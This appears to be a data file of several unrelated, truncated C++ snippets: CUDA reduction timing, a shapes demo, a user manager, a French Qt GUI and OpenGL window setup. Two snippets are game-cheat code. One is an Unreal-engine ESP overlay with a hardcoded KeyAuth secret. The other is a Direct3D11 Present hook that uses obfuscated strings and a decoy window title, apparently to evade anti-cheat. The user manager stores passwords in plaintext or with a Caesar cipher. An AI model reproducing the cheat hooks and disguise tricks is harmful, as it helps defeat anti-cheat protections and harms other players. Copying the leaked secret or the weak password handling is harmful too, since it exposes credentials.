__syncthreads(); }\n    if (blockSize >= 64) { if (tid < 32) { sdata[tid] += sdata[tid + 32]; } __syncthreads(); }\n\n    if (tid < 32) warpReduce(sdata, tid);\n\n    // Write the result for this block to global memory\n    if (tid == 0) atomicAdd(g_odata, sdata[0]);\n}\n\n\nvoid measureKernelExecutionTime(void (*kernel)(long long int, long long int*, unsigned long long int*), int numBlocks, int blockSize, long long int N, long long int *y, unsigned long long int *sum, const char* kernelName) {\n    cudaEvent_t start, stop;\n    cudaEventCreate(&start);\n    cudaEventCreate(&stop);\n\n    *sum = 0;  // Reset sum\n\n    // Record the start event\n    cudaEventRecord(start);\n\n    // Run the kernel on the GPU\n    kernel<<<numBlocks, blockSize>>>(N, y, sum);\n\n    // Wait for GPU to finish before accessing on host\n    cudaDeviceSynchronize();\n\n    // Record the stop event\n    cudaEventRecord(stop);\n\n    // Wait for the stop event to complete\n    cudaEventSynchronize(stop);\n\n    // Calculate elapsed time\n    float milliseconds = 0;\n    cudaEventElapsedTime(&milliseconds, start, stop);\n\n    // Output the sum and the elapsed time\n    std::cout << kernelName << \" - Sum: \" << *sum << \", Time elapsed: \" << milliseconds << \" ms\" << std::endl;",
    "\ufeff#include \"um.h\"\r\n#include \"Print.hpp\"\r\n#include \"xor.hpp\"\r\n#include <dwmapi.h>\r\n#include \"Dog.h\"\r\n#include \"lazy.h\"\r\n#include <Windows.h>\r\n#include <string>\r\n#include <vector>\r\n#include \"Animal.h\"\r\n#include \"Keybind.h\"\r\n#include \"offsets.h\"\r\n#include \"bytes.h\"\r\n#include <d3d11.h>\r\n#include \"directx9/d3dx9.h\"\r\n#include \"directx9/d3dx9.h\"\r\n#include \"conio.h\"\r\n#include \"AUTH/auth.hpp\"\r\n#include \"images.h\"\r\n#include \"config.h\"\r\n\r\n#pragma comment (lib, \"d3d9.lib\")\r\n//#pragma comment (lib, \"d3dx9\")\r\n\r\nusing namespace KeyAuth;\r\nstd::string name = \"test\";\r\nstd::string ownerid = \"3KFIj4XWl3\";\r\nstd::string secret = \"b3712d70dc47cd3b8a30f865c6a7929980a5fe0e8a336568820796777388749d\";\r\nstd::string version = \"1.0\";\r\nstd::string url = \"https://keyauth.win/api/1.2/\";\r\napi KeyAuthApp(name, ownerid, secret, version, url);\r\n\r\n\r\nfloat BOG_TO_GRD(float BOG) {\r\n\treturn (180 / M_PI) * BOG;\r\n}\r\n\r\nfloat GRD_TO_BOG(float GRD) {\r\n\treturn (M_PI / 180) * GRD;\r\n}\r\n\r\n\r\nDWORD64 bonearray;\r\nDWORD_PTR Uworld;\r\nDWORD_PTR LocalPawn;\r\nDWORD_PTR PlayerState;\r\nDWORD_PTR Localplayer;\r\nDWORD_PTR Rootcomp;\r\nDWORD_PTR PlayerController;\r\nDWORD_PTR Persistentlevel;\r\nuintptr_t PlayerCameraManager;\r\nVector3 localactorpos;\r\nuintptr_t virtualaddy;\r\n\r\nIDirect3DTexture9* logo = nullptr;\r\nIDirect3DTexture9* option1 = nullptr;\r\nIDirect3DTexture9* option2 = nullptr;\r\nIDirect3DTexture9* option3 = nullptr;\r\n\r\n//Helpers\r\nImFont* m_pFont;\r\nImFont* details;\r\nImFont* arrow;\r\nImFont* mainfont;\r\nImFont* titlefont;\r\nImFont* icons;\r\nImVec2 position;\r\nImDrawList* drawlist;\r\nImVec2 skeletonpos;\r\nImDrawList* skeletondraw;\r\nint tabs = 0;\r\n\r\nuint64_t TargetPawn;\r\nint localplayerID;\r\n\r\n\r\nRECT GameRect = { NULL };\r\nD3DPRESENT_PARAMETERS d3dpp;\r\nDWORD ScreenCenterX;\r\nDWORD ScreenCenterY;\r\nVector3 LocalRelativeLocation; struct FBoxSphereBounds\r\n{\r\n\tstruct Vector3                                     Origin;                                                   // 0x0000(0x0018) (Edit, BlueprintVisible, ZeroConstructor, SaveGame, IsPlainOldData)\r\n\tstruct Vector3                                     BoxExtent;                                                // 0x0018(0x0018) (Edit, BlueprintVisible, ZeroConstructor, SaveGame, IsPlainOldData)\r\n\tdouble                                             SphereRadius;                                             // 0x0030(0x0008) (Edit, BlueprintVisible, ZeroConstructor, SaveGame, IsPlainOldData)\r\n};\r\nstatic void xCreateWindow();\r\nstatic void xInitD3d();\r\nstatic void xMainLoop();\r\nstatic void xShutdown();\r\nstatic LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam);\r\nextern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);\r\n\r\nstatic HWND Window = NULL;\r\nIDirect3D9Ex* p_Object = NULL;\r\nstatic LPDIRECT3DDEVICE9 D3dDevice = NULL;\r\nstatic LPDIRECT3DVERTEXBUFFER9 TriBuf = NULL;\r\n\r\ntypedef struct {\r\n\tfloat X, Y, Z;\r\n} FVector;\r\n\r\ntypedef struct {\r\n\tfloat X, Y;\r\n} FVector2D;\r\n\r\ntypedef struct {\r\n\tfloat Pitch;\r\n\tfloat Yaw;\r\n\tfloat Roll;\r\n} FRotator;\r\n\r\ntypedef struct {\r\n\tFVector Location;\r\n\tfloat FOV;\r\n\tfloat OrthoWidth;\r\n\tfloat OrthoNearClipPlane;\r\n\tfloat OrthoFarClipPlane;\r\n\tfloat AspectRatio;\r\n} FMinimalViewInfo;\r\n\r\ntypedef struct {\r\n\tfloat M[4][4];\r\n} FMatrix;\r\n\r\ntypedef struct {\r\n\tFVector ViewOrigin;\r\n\tchar _padding_0[4];\r\n\tFMatrix ViewRotationMatrix;\r\n\tFMatrix ProjectionMatrix;\r\n} FSceneViewProjectionData;\r\n\r\n\r\n\r\n\r\nclass UClass {\r\npublic:\r\n\tBYTE _padding_0[0x40];\r\n\tUClass* SuperClass;\r\n};\r\n\r\nclass UObject {\r\npublic:\r\n\tPVOID VTableObject;\r\n\tDWORD ObjectFlags;\r\n\tDWORD InternalIndex;\r\n\tUClass* Class;\r\n\tBYTE _padding_0[0x8];\r\n\tUObject* Outer;\r\n\r\n\tinline BOOLEAN IsA(PVOID parentClass) {\r\n\t\tfor (auto super = this->Class; super; super = super->SuperClass) {\r\n\t\t\tif (super == parentClass) {\r\n\t\t\t\treturn TRUE;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\treturn FALSE;\r\n\t}\r\n};\r\n\r\nvoid DrawLine(int x1, int y1, int x2, int y2, RGBA* color, int thickness)\r\n{\r\n\tImGui::GetOverlayDrawList()->AddLine(ImVec2(x1, y1), ImVec2(x2, y2), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), thickness);\r\n}\r\n\r\n\r\nclass FUObjectItem {\r\npublic:\r\n\tUObject* Object;\r\n\tDWORD Flags;\r\n\tDWORD ClusterIndex;\r\n\tDWORD SerialNumber;\r\n\tDWORD SerialNumber2;\r\n};\r\n\r\nclass TUObjectArray {\r\npublic:\r\n\tFUObjectItem* Objects[9];\r\n};\r\n\r\nclass GObjects {\r\npublic:\r\n\tTUObjectArray* ObjectArray;\r\n\tBYTE _padding_0[0xC];\r\n\tDWORD ObjectCount;\r\n};\r\n\r\n\r\ntemplate<class T>\r\nstruct TArray {\r\n\tfriend struct FString;\r\n\r\npublic:\r\n\tinline TArray() {\r\n\t\tData = nullptr;\r\n\t\tCount = Max = 0;\r\n\t};\r\n\r\n\tinline INT Num() const {\r\n\t\treturn Count;\r\n\t};\r\n\r\n\tinline T& operator[](INT i) {\r\n\t\treturn Data[i];\r\n\t};\r\n\r\n\tinline BOOLEAN IsValidIndex(INT i) {\r\n\t\treturn i < Num();\r\n\t}\r\n\r\nprivate:\r\n\tT* Data;\r\n\tINT Count;\r\n\tINT Max;\r\n};\r\n\r\nstruct FString : private TArray<WCHAR> {\r\n\tFString() {\r\n\t\tData = nullptr;\r\n\t\tMax = Count = 0;\r\n\t}\r\n\r\n\tFString(LPCWSTR other) {\r\n\t\tMax = Count = static_cast<INT>(wcslen(other));\r\n\r\n\t\tif (Count) {\r\n\t\t\tData = co",
    "#include <iostream>\n\nusing namespace std;\n\nclass Drawable {\n    public:\n        virtual void draw() = 0; \n        virtual void move(int x, int y) = 0;\n};\n\nclass Circle : public Drawable {\n    public:\n        void draw() {\n            cout << \"Drawing a circle\" << endl;\n        }\n    \n        void move(int x, int y) {\n            cout << \"Moving the circle by (\" << x << \", \" << y << \")\" << endl;\n        }\n};\n\n\nclass Rectangle : public Drawable {\n    public:\n        void draw() {\n            cout << \"Drawing a rectangle\" << endl;\n        }\n    \n        void move(int x, int y) {\n            cout << \"Moving the rectangle by (\" << x << \", \" << y << \")\" << endl;\n        }\n};\n\n\nclass Triangle : public Drawable {\n    public:\n        void draw() {\n            cout << \"Drawing a triangle\" << endl;\n        }\n    \n        void move(int x, int y) {\n            cout << \"Moving the triangle by (\" << x << \", \" << y << \")\" << endl;\n        }\n};\n\nint main() {\n    // Create objects of different shapes\n    Circle circle;\n    Rectangle rectangle;\n    Triangle triangle;\n\n    // Draw the shapes\n    circle.draw();\n    rectangle.draw();\n    triangle.draw();\n\n    // Move the shapes\n    circle.move(10, 10);\n    rectangle.move(5, 5);\n    triangle.move(15, 15);\n\n    return 0;\n}",
    "#include <iostream>\r\n#include <fstream>\r\n#include <sstream>\r\n#include <string>\r\n#include <vector>\r\n#include <map>\r\n#include <algorithm>\r\n#include <curl/curl.h>\r\n#include <cstdlib>\r\n\r\n// Encryption key (shift amount for Caesar Cipher)\r\nconst int SHIFT = 3;\r\n\r\n// Function to split a string by a delimiter\r\nstd::vector<std::string> split(const std::string &s, char delimiter) {\r\n    std::vector<std::string> tokens;\r\n    std::string token;\r\n    std::istringstream tokenStream(s);\r\n    while (std::getline(tokenStream, token, delimiter)) {\r\n        tokens.push_back(token);\r\n    }\r\n    return tokens;\r\n}\r\n\r\n// Function to convert an integer to a string (replacement for std::to_string)\r\nstd::string to_string(int value) {\r\n    std::ostringstream oss;\r\n    oss << value;\r\n    return oss.str();\r\n}\r\n\r\n// Custom function to convert a string to an integer\r\nint stringToInt(const std::string &str) {\r\n    int result;\r\n    std::istringstream(str) >> result;\r\n    return result;\r\n}\r\n\r\n// Function to encrypt a string using Caesar Cipher\r\nstd::string encrypt(const std::string &text, int shift) {\r\n    std::string result = text;\r\n    for (size_t i = 0; i < result.size(); ++i) {\r\n        if (isalpha(result[i])) {\r\n            char base = islower(result[i]) ? 'a' : 'A';\r\n            result[i] = (result[i] - base + shift) % 26 + base;\r\n        }\r\n    }\r\n    return result;\r\n}\r\n\r\n// Function to decrypt a string using Caesar Cipher\r\nstd::string decrypt(const std::string &text, int shift) {\r\n    return encrypt(text, 26 - shift);\r\n}\r\n\r\n// User class to represent each user\r\nclass User {\r\npublic:\r\n    std::string role;\r\n    std::string username;\r\n    std::string password;\r\n\r\n    User(std::string r, std::string u, std::string p) : role(r), username(u), password(p) {}\r\n\r\n    bool operator<(const User &other) const {\r\n        return username < other.username;\r\n    }\r\n\r\n    bool operator==(const User &other) const {\r\n        return username == other.username;\r\n    }\r\n};\r\n\r\n// UserNode class to represent each node in the binary search tree\r\nclass UserNode {\r\npublic:\r\n    User user;\r\n    UserNode* left;\r\n    UserNode* right;\r\n\r\n    UserNode(User u) : user(u), left(NULL), right(NULL) {}\r\n};\r\n\r\n// UserTree class to manage the binary search tree operations\r\nclass UserTree {\r\nprivate:\r\n    UserNode* root;\r\n\r\n    UserNode* insert(UserNode* node, User user) {\r\n        if (node == NULL) {\r\n            return new UserNode(user);\r\n        }\r\n        if (user < node->user) {\r\n            node->left = insert(node->left, user);\r\n        } else {\r\n            node->right = insert(node->right, user);\r\n        }\r\n        return node;\r\n    }\r\n\r\n    UserNode* findMin(UserNode* node) {\r\n        while (node->left != NULL) node = node->left;\r\n        return node;\r\n    }\r\n\r\n    UserNode* remove(UserNode* node, std::string username) {\r\n        if (node == NULL) return node;\r\n        if (username < node->user.username) {\r\n            node->left = remove(node->left, username);\r\n        } else if (username > node->user.username) {\r\n            node->right = remove(node->right, username);\r\n        } else {\r\n            if (node->left == NULL) {\r\n                UserNode* temp = node->right;\r\n                delete node;\r\n                return temp;\r\n            } else if (node->right == NULL) {\r\n                UserNode* temp = node->left;\r\n                delete node;\r\n                return temp;\r\n            }\r\n            UserNode* temp = findMin(node->right);\r\n            node->user = temp->user;\r\n            node->right = remove(node->right, temp->user.username);\r\n        }\r\n        return node;\r\n    }\r\n\r\n    UserNode* search(UserNode* node, std::string username) {\r\n        if (node == NULL || node->user.username == username) {\r\n            return node;\r\n        }\r\n        if (username < node->user.username) {\r\n            return search(node->left, username);\r\n        }\r\n        return search(node->right, username);\r\n    }\r\n\r\npublic:\r\n    UserTree() : root(NULL) {}\r\n\r\n    void insert(User user) {\r\n        root = insert(root, user);\r\n    }\r\n\r\n    void remove(std::string username) {\r\n        root = remove(root, username);\r\n    }\r\n\r\n    User* search(std::string username) {\r\n        UserNode* result = search(root, username);\r\n        if (result != NULL) {\r\n            return &result->user;\r\n        }\r\n        return NULL;\r\n    }\r\n\r\n    void inOrder(UserNode* node, std::ofstream& file) {\r\n        if (node != NULL) {\r\n            inOrder(node->left, file);\r\n            file << \"Role:\" << node->user.role << \";username:\" << node->user.username << \";password:\" << node->user.password << \",\";\r\n            inOrder(node->right, file);\r\n        }\r\n    }\r\n\r\n    void saveToFile(std::string filename) {\r\n        std::ofstream file(filename.c_str());\r\n        if (!file.is_open()) {\r\n            std::cerr << \"Error al abrir el archivo \" << filename << std::endl;\r\n            return;\r\n        }\r\n        inOrder(root, file);\r\n        file.close();\r\n    }\r\n\r\n    UserNode* getRoot() {\r\n       ",
    "#include \"d3d_Hook.hpp\"\r\n\r\n#include <MinHook.h>\r\n\r\nbool Hook::Init()\r\n{\r\n\tconst std::string Title = E(\"SKYPE TERMINAL CALLING\");\r\n\r\n\tWNDCLASSEX Window;\r\n\r\n\tWindow.cbSize = sizeof(WNDCLASSEX);\r\n\tWindow.style = CS_HREDRAW | CS_VREDRAW;\r\n\r\n\tWindow.lpfnWndProc = DefWindowProcA;\r\n\tWindow.cbClsExtra = NULL;\r\n\tWindow.cbWndExtra = NULL;\r\n\tWindow.hInstance = SAFE_CALL(GetModuleHandleA)(nullptr);\r\n\tWindow.hIcon = NULL;\r\n\tWindow.hCursor = NULL;\r\n\tWindow.hbrBackground = NULL;\r\n\tWindow.lpszMenuName = NULL;\r\n\tWindow.lpszClassName = Title.c_str();\r\n\tWindow.hIconSm = NULL;\r\n\r\n\tSAFE_CALL(RegisterClassExA)(&Window);\r\n\r\n\tHWND WindowA = CreateWindowA(Window.lpszClassName, Title.c_str(), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, 0, 0, Window.hInstance, 0);\r\n\r\n\tHMODULE D3D11_DLL;\r\n\tif ((D3D11_DLL = SAFE_CALL(GetModuleHandleA)(E(\"d3d11.dll\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tvoid* D3D11CreateDeviceAndSwapChain;\r\n\r\n\tif ((D3D11CreateDeviceAndSwapChain = SAFE_CALL(GetProcAddress)(D3D11_DLL, E(\"D3D11CreateDeviceAndSwapChain\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tD3D_FEATURE_LEVEL featureLevel;\r\n\tconst D3D_FEATURE_LEVEL featureLevels[] = { D3D_FEATURE_LEVEL_10_1, D3D_FEATURE_LEVEL_11_0 };\r\n\tDXGI_RATIONAL refreshRate;\r\n\trefreshRate.Numerator = 60;\r\n\trefreshRate.Denominator = 1;\r\n\r\n\tDXGI_MODE_DESC bufferDesc;\r\n\tbufferDesc.Width = 100;\r\n\tbufferDesc.Height = 100;\r\n\tbufferDesc.RefreshRate = refreshRate;\r\n\tbufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\r\n\tbufferDesc.ScanlineOrdering = DXGI_MODE_SCANLINE_ORDER_UNSPECIFIED;\r\n\tbufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;\r\n\r\n\tDXGI_SAMPLE_DESC sampleDesc;\r\n\tsampleDesc.Count = 1;\r\n\tsampleDesc.Quality = 0;\r\n\r\n\tDXGI_SWAP_CHAIN_DESC swapChainDesc;\r\n\tswapChainDesc.BufferDesc = bufferDesc;\r\n\tswapChainDesc.SampleDesc = sampleDesc;\r\n\tswapChainDesc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\r\n\tswapChainDesc.BufferCount = 1;\r\n\tswapChainDesc.OutputWindow = WindowA;\r\n\tswapChainDesc.Windowed = 1;\r\n\tswapChainDesc.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;\r\n\tswapChainDesc.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;\r\n\r\n\tIDXGISwapChain* swapChain;\r\n\tID3D11Device* device;\r\n\tID3D11DeviceContext* context;\r\n\r\n\tif (((long(__stdcall*)(\r\n\t\tIDXGIAdapter*,\r\n\t\tD3D_DRIVER_TYPE,\r\n\t\tHMODULE,\r\n\t\tUINT,\r\n\t\tconst D3D_FEATURE_LEVEL*,\r\n\t\tUINT,\r\n\t\tUINT,\r\n\t\tconst DXGI_SWAP_CHAIN_DESC*,\r\n\t\tIDXGISwapChain**,\r\n\t\tID3D11Device**,\r\n\t\tD3D_FEATURE_LEVEL*,\r\n\t\tID3D11DeviceContext**))(D3D11CreateDeviceAndSwapChain))(0, D3D_DRIVER_TYPE_HARDWARE, 0, 0, featureLevels, 2, D3D11_SDK_VERSION, &swapChainDesc, &swapChain, &device, &featureLevel, &context) < 0)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tg_methodsTable = (uint64_t*)calloc(205, sizeof(uint64_t));\r\n\r\n\tmemcpy(g_methodsTable, *(uint64_t**)swapChain, 18 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18, *(uint64_t**)device, 43 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18 + 43, *(uint64_t**)context, 144 * sizeof(uint64_t));\r\n\r\n\tMH_Initialize();\r\n\r\n\tswapChain->Release();\r\n\tswapChain = 0;\r\n\r\n\tdevice->Release();\r\n\tdevice = 0;\r\n\r\n\tcontext->Release();\r\n\tcontext = 0;\r\n\r\n\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\treturn true;\r\n}\r\n\r\nbool Hook::Present(void** hk_originalFunction, void* hk_hookedPresent)\r\n{\r\n\tif (!hk_originalFunction || !hk_hookedPresent)\r\n\t\treturn false;\r\n\r\n\tvoid* target = (void*)g_methodsTable[8];\r\n\r\n\tif (!target)\r\n\t\treturn false;\r\n\r\n\tif (MH_CreateHook(target, hk_hookedPresent, hk_originalFunction) != MH_OK || MH_EnableHook(target) != MH_OK)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\treturn true;\r\n}",
    "#include \"mainwindow.h\"\r\n#include \"ui_mainwindow.h\"\r\n#include \"fichier.h\"\r\n#include <QDate>\r\n#include <QPixmap>\r\n\r\n    MainWindow::MainWindow(QWidget *parent) :\r\n    QMainWindow(parent),\r\n    ui(new Ui::MainWindow)\r\n{\r\n    ui->setupUi(this);\r\n    QPixmap pix(\":/logo/eni.png\");\r\n    int a = ui->eni->width();\r\n    int b = ui->eni->height();\r\n    ui->eni->setPixmap(pix.scaled(a,b,Qt::KeepAspectRatio));\r\n    QPixmap pic(\":/logo/univ.png\");\r\n    int c = ui->univ->width();\r\n    int d = ui->univ->height();\r\n    ui->univ->setPixmap(pic.scaled(c,d,Qt::KeepAspectRatio));\r\n\r\n    QPixmap pics(\":/icon/912318.png\");\r\n    int e = ui->employe->width();\r\n    int f = ui->employe->height();\r\n    ui->employe->setPixmap(pics.scaled(e,f,Qt::KeepAspectRatio));\r\n\r\n    QPixmap pixs(\":/icon/customer-service_icon-icons.com_52843.png\");\r\n    int g = ui->service->width();\r\n    int h = ui->service->height();\r\n    ui->service->setPixmap(pixs.scaled(g,h,Qt::KeepAspectRatio));\r\n\r\n    QPixmap pixis(\":/icon/1869679.png\");\r\n    int i = ui->dec_empl->width();\r\n    int j = ui->dec_empl->height();\r\n    ui->dec_empl->setPixmap(pixis.scaled(i,j,Qt::KeepAspectRatio));\r\n\r\n    QPixmap pixagape(\":/icon/1869679.png\");\r\n    int k = ui->agape->width();\r\n    int l = ui->agape->height();\r\n    ui->agape->setPixmap(pixagape.scaled(k,l,Qt::KeepAspectRatio));\r\n    QPixmap pixfita(\":/icon/1869679.png\");\r\n    int m = ui->fita->width();\r\n    int n = ui->fita->height();\r\n    ui->fita->setPixmap(pixfita.scaled(m,n,Qt::KeepAspectRatio));\r\n    QPixmap pixfanilo(\":/icon/1869679.png\");\r\n    int o = ui->fanilo->width();\r\n    int p = ui->fanilo->height();\r\n    ui->fanilo->setPixmap(pixfanilo.scaled(o,p,Qt::KeepAspectRatio));\r\n    QPixmap pixaina(\":/icon/1869679.png\");\r\n    int q = ui->aina->width();\r\n    int r = ui->aina->height();\r\n    ui->aina->setPixmap(pixaina.scaled(q,r,Qt::KeepAspectRatio));\r\n    QPixmap pixtonga(\":/icon/1869679.png\");\r\n    int s = ui->tongalaza->width();\r\n    int t = ui->tongalaza->height();\r\n    ui->tongalaza->setPixmap(pixtonga.scaled(s,t,Qt::KeepAspectRatio));\r\n    startup();\r\n\r\n}\r\n    MainWindow::~MainWindow()\r\n{\r\n    delete ui;\r\n}\r\n    void MainWindow::startup(){\r\n    ui->stackedWidget->setCurrentIndex(0);\r\n    liste();\r\n    liste1();\r\n    liste2();\r\n    liste3();\r\n    cacher_element();\r\n    cacher_element1();\r\n    cacher_element2();\r\n}\r\n\r\n/*--------------------LES--FONCTIONS--DU--FICHIER--SERVICE--------------------*/\r\n\r\nvoid MainWindow::on_demarrer_clicked()  // Boutton a cliquer pour ouvrir le fichier SERVICE\r\n    {\r\n        ui->stackedWidget->setCurrentIndex(2);\r\n    }\r\nvoid MainWindow::afficher_element()   //  AFFICHIER  DES  ELEMENTS\r\n{\r\n    ui->modification->show();\r\n    ui->modifier->show();\r\n    ui->supprimer->show();\r\n    ui->nouveau->hide();\r\n    ui->actualiser_annul->show();\r\n}\r\nvoid MainWindow::cacher_element()   // CACHER DES ELEMENTS\r\n{\r\n    ui->modification->hide();\r\n    ui->modifier->hide();\r\n    ui->supprimer->hide();\r\n    ui->actualiser_annul->hide();\r\n    ui->actualiser_rchr->hide();\r\n    ui->liste_pat->hide();\r\n}\r\nvoid MainWindow::liste()    //  Liste des services dans le tableWidget\r\n{\r\n   int nb;\r\n   char control[10];\r\n   FILE *fic=fopen(\"service.txt\",\"r\");\r\n   fscanf(fic,\"%s\",control);\r\n   if (!feof(fic)){\r\n       fclose(fic);\r\n       service * ser = listeService(&nb);\r\n\r\n       ui->tableWidget->setRowCount(0);\r\n\r\n       for(int i=0; i < nb; i++){\r\n           ui->tableWidget->insertRow(i);\r\n           ui->tableWidget->setItem(i, 0, new QTableWidgetItem(ser[i].numero_service));\r\n           ui->tableWidget->setItem(i, 1, new QTableWidgetItem(ser[i].raison));\r\n           //ui->tableWidget->setItem(i, 2, new QTableWidgetItem(QString::number(ser[i].taux)));\r\n        }\r\n    }\r\n   else ui->tableWidget->setRowCount(0);\r\n   fclose(fic);\r\n\r\n}\r\nvoid MainWindow::on_ajouter_clicked()   // Ajouter un nouveau SERVICE\r\n{\r\n\r\n    QString numero_service1 = ui->numero_service->text();\r\n    QString raison1 = ui->raison->text();\r\n\r\n   // int taux1 = ui->taux->value();\r\n\r\n    service ser;\r\n    strcpy(ser.numero_service, numero_service1.toUtf8());\r\n    strcpy(ser.raison, raison1.toUtf8());\r\n\r\n    //ser.taux = taux1;\r\n\r\n\r\n    FILE *fd = fopen(\"service.txt\", \"r\");\r\n    bool trouve=false;\r\n    service doc;\r\n    while(!feof(fd)){\r\n        fscanf(fd, \"%s\\t %s\\n\", doc.numero_service, doc.raison);\r\n        if((strcmp(doc.numero_service,numero_service1.toUtf8())==0))\r\n        {\r\n            trouve=true;\r\n            break;\r\n        }\r\n    }\r\n    if(numero_service1 == \"\" &&  raison1==\"\"){\r\n        QMessageBox::warning(this, \"AJOUT\", \"Tout les chaps doivent etre renseign\u00e9s\");\r\n    }\r\n    else if(trouve)  {\r\n        QMessageBox::warning(this, \"AJOUT\", \"Service existe dej\u00e0\");\r\n    }\r\n    else{\r\n        ajoutService(ser);\r\n        QMessageBox::information(this, \"AJOUT\", \" Succ\u00e8s \");\r\n        effacer();\r\n        liste();\r\n        liste3();\r\n    }\r\n    fclose(fd);\r\n}\r\nvoid MainWindow::on_modifier_clicked()  // Modifier un SERVICE\r\n{\r\n    QString numero_serv",
    "\r\n#pragma once\r\n\r\n#ifdef _WIN32\r\n#  define WINDOWS_LEAN_AND_MEAN\r\n#  define NOMINMAX\r\n#  include <windows.h>\r\n#endif\r\n\r\n#pragma comment(lib, \"opengl32.lib\")\r\n#pragma comment(lib, \"glu32.lib\")\r\n\r\n#include <GLScene.h>\r\n\r\n#include <GL/glut.h>\r\n#include <stdlib.h>\r\n#include <iostream>\r\n#include <windows.h>\t\t// Header File For Windows\r\n\r\nusing namespace std;\r\n\r\nGLScene *scene = new GLScene(); // create scene class instance\r\n\r\nHDC\t\t\thDC=NULL;\t\t// Private GDI Device Context\r\nHGLRC\t\thRC=NULL;\t\t// Permanent Rendering Context\r\nHWND\t\thWnd=NULL;\t\t// Holds Our Window Handle\r\nHINSTANCE\thInstance;\t\t// Holds The Instance Of The Application\r\n\r\nbool\tkeys[256];\t\t\t// Array Used For The Keyboard Routine\r\nbool\tactive=TRUE;\t\t// Window Active Flag Set To TRUE By Default\r\nbool\tfullscreen=TRUE;\t// Fullscreen Flag Set To Fullscreen Mode By Default\r\n\r\nLRESULT\tCALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);\t// Declaration For WndProc\r\n\r\n//GLScene *Scene = new GLScene();\r\n\r\n/////////////////////////////////////////////////////////////////////////////////////////////////\r\n//\t\t\t\t\t\t\t\t\t\tTHE KILL GL WINDOW\r\n/////////////////////////////////////////////////////////////////////////////////////////////////\r\nvoid KillGLWindow()\t\t\t\t\t\t\t\t// Properly Kill The Window\r\n{\r\n\tif (fullscreen)\t\t\t\t\t\t\t\t\t\t// Are We In Fullscreen Mode?\r\n\t{\r\n\t\tChangeDisplaySettings(NULL,0);\t\t\t\t\t// If So Switch Back To The Desktop\r\n\t\tShowCursor(TRUE);\t\t\t\t\t\t\t\t// Show Mouse Pointer\r\n\t}\r\n\r\n\tif (hRC)\t\t\t\t\t\t\t\t\t\t\t// Do We Have A Rendering Context?\r\n\t{\r\n\t\tif (!wglMakeCurrent(NULL,NULL))\t\t\t\t\t// Are We Able To Release The DC And RC Contexts?\r\n\t\t{\r\n\t\t\tMessageBox(NULL,\"Release Of DC And RC Failed.\",\"SHUTDOWN ERROR\",MB_OK | MB_ICONINFORMATION);\r\n\t\t}\r\n\r\n\t\tif (!wglDeleteContext(hRC))\t\t\t\t\t\t// Are We Able To Delete The RC?\r\n\t\t{\r\n\t\t\tMessageBox(NULL,\"Release Rendering Context Failed.\",\"SHUTDOWN ERROR\",MB_OK | MB_ICONINFORMATION);\r\n\t\t}\r\n\t\thRC=NULL;\t\t\t\t\t\t\t\t\t\t// Set RC To NULL\r\n\t}\r\n\r\n\tif (hDC && !ReleaseDC(hWnd,hDC))\t\t\t\t\t// Are We Able To Release The DC\r\n\t{\r\n\t\tMessageBox(NULL,\"Release Device Context Failed.\",\"SHUTDOWN ERROR\",MB_OK | MB_ICONINFORMATION);\r\n\t\thDC=NULL;\t\t\t\t\t\t\t\t\t\t// Set DC To NULL\r\n\t}\r\n\r\n\tif (hWnd && !DestroyWindow(hWnd))\t\t\t\t\t// Are We Able To Destroy The Window?\r\n\t{\r\n\t\tMessageBox(NULL,\"Could Not Release hWnd.\",\"SHUTDOWN ERROR\",MB_OK | MB_ICONINFORMATION);\r\n\t\thWnd=NULL;\t\t\t\t\t\t\t\t\t\t// Set hWnd To NULL\r\n\t}\r\n\r\n\tif (!UnregisterClass(\"OpenGL\",hInstance))\t\t\t// Are We Able To Unregister Class\r\n\t{\r\n\t\tMessageBox(NULL,\"Could Not Unregister Class.\",\"SHUTDOWN ERROR\",MB_OK | MB_ICONINFORMATION);\r\n\t\thInstance=NULL;\t\t\t\t\t\t\t\t\t// Set hInstance To NULL\r\n\t}\r\n}\r\n\r\n/*\tThis Code Creates Our OpenGL Window.  Parameters Are:\t\t\t\t\t*\r\n *\ttitle\t\t\t- Title To Appear At The Top Of The Window\t\t\t\t*\r\n *\twidth\t\t\t- Width Of The GL Window Or Fullscreen Mode\t\t\t\t*\r\n *\theight\t\t\t- Height Of The GL Window Or Fullscreen Mode\t\t\t*\r\n *\tbits\t\t\t- Number Of Bits To Use For Color (8/16/24/32)\t\t\t*\r\n *\tfullscreenflag\t- Use Fullscreen Mode (TRUE) Or Windowed Mode (FALSE)\t*/\r\n\r\n/////////////////////////////////////////////////////////////////////////////////////////////////\r\n//\t\t\t\t\t\t\t\t\t\tTHE CREATE GL WINDOW\r\n/////////////////////////////////////////////////////////////////////////////////////////////////\r\nBOOL CreateGLWindow(char* title, int width, int height, int 